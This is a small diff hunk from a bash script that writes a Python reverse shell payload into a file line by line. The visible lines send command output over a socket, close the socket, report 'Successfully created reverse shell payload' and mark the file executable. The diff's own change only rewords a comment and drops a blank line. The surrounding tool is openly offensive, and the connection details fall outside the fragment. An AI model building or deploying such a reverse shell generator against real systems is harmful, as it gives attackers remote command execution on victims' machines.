@@ -19,6 +19,5 @@ echo "	s.send(stdout_value)" >> $file
 echo "s.close()" >> $file
 # print status (success/error)
 [[ -f $file ]] && echo "Successfully created reverse shell payload in $file ..." &&
-	chmod +x $file # give +x rights to the file
+	chmod +x $file # give r:w:x rights to the file
 [[ ! -f $file ]] && echo "script:err: An error occured during the process of creating $file ..." && break
-
